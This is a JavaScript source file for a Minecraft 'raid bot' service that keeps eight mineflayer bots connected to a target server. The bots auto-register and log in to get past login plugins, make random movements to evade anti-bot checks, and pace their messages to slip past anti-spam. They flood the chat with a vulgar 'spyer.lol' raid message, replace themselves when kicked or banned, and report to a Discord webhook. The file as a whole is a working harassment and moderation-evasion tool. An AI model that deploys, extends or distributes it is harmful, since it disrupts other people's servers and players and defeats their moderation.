const express = require('express');
const mineflayer = require('mineflayer');

// Render Web Service Uptime
const app = express();
const PORT = process.env.PORT || 8080;

app.get('/', (req, res) => {
    res.send('Minecraft Raid Bot Service is Active & Running!');
});

app.listen(PORT, () => {
    console.log(`[+] Web server listening on port ${PORT}`);
});

// ---------------- ENVIRONMENT CONFIGURATION ----------------
const SERVER_IP = process.env.SERVER_IP || '127.0.0.1';
const SERVER_PORT = parseInt(process.env.SERVER_PORT || '25565');
const PASSWORD = process.env.BOT_PASSWORD || 'RaidPass123';
const BASE_BOT_NAME = process.env.BOT_NAME || 'RaidBot';
const WEBHOOK_URL = process.env.WEBHOOK_URL || ''; // Discord Webhook URL

const TOTAL_BOTS = 8;
const MESSAGE_INTERVAL = 10000; // 10 seconds delay between messages to bypass anti-spam
const MAX_CONNECT_ATTEMPTS = 10; // Max 10 attempts before going to sleep
const RUN_DURATION_LIMIT = 40 * 60 * 1000; // 40 minutes limit after online

let activeBots = [];
let isRunning = true;
let isSleeping = false;
let connectAttempts = 0;
let runTimer = null;
let globalMessageCounter = 1; // Unlimited incrementing number counter for chat

// Discord Webhook par logs bhejne ka function
async function sendWebhook(title, description, color = 3447003) {
    if (!WEBHOOK_URL || isSleeping) return; // Agar sleep mode mein hai ya webhook nahi hai toh message nahi jayega

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: title,
                    description: description,
                    color: color,
                    timestamp: new Date().toISOString()
                }]
            })
        });

        if (!response.ok) {
            console.error(`[-] Webhook Error: Server responded with status ${response.status}`);
        }
    } catch (error) {
        console.error('[-] Webhook Failed to Send:', error.message);
    }
}

// Bot ko sleep mode mein daalne ka function
function enterSleepMode(reason) {
    if (isSleeping) return;
    isSleeping = true;
    isRunning = false;

    console.log(`[💤] SLEEP MODE ACTIVATED: ${reason}`);
    
    // Sabhi active bots ko disconnect kar do
    activeBots.forEach(bot => {
        try { bot.quit(); } catch (e) {}
    });
    activeBots = [];

    // Webhook par ek baar sleep notification bhej do
    if (WEBHOOK_URL) {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "💤 Bot Went to Sleep",
                    description: `Server offline hone ya limit poori hone ki wajah se bot sleep mode mein chala gaya hai.\n**Reason:** ${reason}\n\n*Ab Render par redeploy karne ke baad hi yeh dobara start hoga.*`,
                    color: 10066329, // Gray color
                    timestamp: new Date().toISOString()
                }]
            })
        }).catch(() => {});
    }
}

// Ek single bot ko create karne ka function
function spawnSingleBot() {
    if (!isRunning || isSleeping) return;

    const username = `${BASE_BOT_NAME}_${Math.floor(Math.random() * 9000 + 1000)}`;
    
    const bot = mineflayer.createBot({
        host: SERVER_IP,
        port: SERVER_PORT,
        username: username,
        auth: 'offline',
        brand: 'vanilla'
    });

    activeBots.push(bot);

    bot.on('spawn', () => {
        // Server online mil gaya! Attempts reset kar do
        connectAttempts = 0;
        
        const successMsg = `[+] Bot **${username}** successfully server par join ho gaya hai!`;
        console.log(successMsg);
        sendWebhook('🟢 Bot Connected', successMsg, 3066993).catch(() => {});

        // AuthMe / Login Plugin Bypass
        setTimeout(() => {
            if (!isRunning || isSleeping) return;
            bot.chat(`/register ${PASSWORD} ${PASSWORD}`);
            setTimeout(() => {
                if (!isRunning || isSleeping) return;
                bot.chat(`/login ${PASSWORD}`);
            }, 2000);
        }, 3000);

        // Anti-Bot bypass movement (5s walk/jump -> 3s stop)
        function startMovement() {
            if (!isRunning || isSleeping) return;
            bot.setControlState('forward', true);
            bot.setControlState('jump', Math.random() > 0.5);
            const randomYaw = Math.random() * Math.PI * 2;
            bot.look(randomYaw, 0, true);

            setTimeout(() => {
                if (!isRunning || isSleeping) return;
                bot.setControlState('forward', false);
                bot.setControlState('jump', false);

                setTimeout(() => {
                    startMovement();
                }, 3000);
            }, 5000);
        }

        setTimeout(startMovement, 4000);

        // Raid Chat Logic: "raided by spyer.lol [number]" with 10s gap
        const chatInterval = setInterval(() => {
            if (!isRunning || isSleeping) {
                clearInterval(chatInterval);
                return;
            }

            const raidMsg = `this server fukxed by spyer.lol ${globalMessageCounter}`;
            bot.chat(raidMsg);
            console.log(`[💬] (${username}) Sent: "${raidMsg}"`);
            
            globalMessageCounter++; // Har message ke baad number unlimited badhta rahega (1, 2, 3...)
        }, MESSAGE_INTERVAL);

        bot.on('end', () => {
            clearInterval(chatInterval);
        });
    });

    bot.on('kicked', (reason) => {
        const kickMsg = `[-] Bot **${username}** kick/ban ho gaya! Reason: ${reason}`;
        console.log(kickMsg);
        sendWebhook('🔴 Bot Kicked / Banned', kickMsg, 15158332).catch(() => {});
        cleanupAndReplace(bot);
    });

    bot.on('error', (err) => {
        const errorMsg = `[-] Bot **${username}** Connection Error: ${err.message}`;
        console.log(errorMsg);
        
        // Agar server offline hai (ECONNREFUSED / ETIMEDOUT), toh attempt count badhao
        if (err.message.includes('ECONNREFUSED') || err.message.includes('ETIMEDOUT') || err.message.includes('ENOTFOUND')) {
            connectAttempts++;
            console.log(`[!] Connection attempt failed (${connectAttempts}/${MAX_CONNECT_ATTEMPTS})`);
            
            if (connectAttempts >= MAX_CONNECT_ATTEMPTS) {
                enterSleepMode(`Server offline hai. 10 connection attempts fail ho chuke hain.`);
                return;
            }
        }

        sendWebhook('⚠️ Bot Error / Offline', errorMsg, 15158332).catch(() => {});
        cleanupAndReplace(bot);
    });
}

// Cleanup and replace disconnected bots
function cleanupAndReplace(botInstance) {
    if (isSleeping) return;

    const idx = activeBots.indexOf(botInstance);
    if (idx !== -1) {
        activeBots.splice(idx, 1);
    }

    if (isRunning && !isSleeping) {
        setTimeout(() => {
            if (isRunning && !isSleeping) {
                spawnSingleBot();
            }
        }, 5000);
    }
}

// Background loop to maintain bot count
function maintainBotsLoop() {
    setInterval(() => {
        if (!isRunning || isSleeping) return;
        
        if (activeBots.length < TOTAL_BOTS) {
            const needed = TOTAL_BOTS - activeBots.length;
            for (let i = 0; i < needed; i++) {
                if (isSleeping) break;
                setTimeout(() => {
                    if (!isSleeping) spawnSingleBot();
                }, i * 2000);
            }
        }
    }, 10000);
}

// Initial Launch
function startRaidBots() {
    console.log(`[*] Raid Bot service started. Target: ${SERVER_IP}:${SERVER_PORT}. Anti-spam mode active (10s delay).`);
    sendWebhook('🚀 Raid Bot Service Started', `Target Server: \`${SERVER_IP}:${SERVER_PORT}\`. Connecting with raided by spyer.lol chat...`, 3447003).catch(() => {});

    for (let i = 0; i < TOTAL_BOTS; i++) {
        setTimeout(() => {
            if (!isRunning || isSleeping) return;
            spawnSingleBot();
        }, i * 2000);
    }

    maintainBotsLoop();

    // 40 minutes ke baad automatically sleep mode mein chale jana
    runTimer = setTimeout(() => {
        enterSleepMode(`40 minutes ka time limit pura ho gaya hai.`);
    }, RUN_DURATION_LIMIT);
}

// Boot up
setTimeout(() => {
    startRaidBots();
}, 2000);
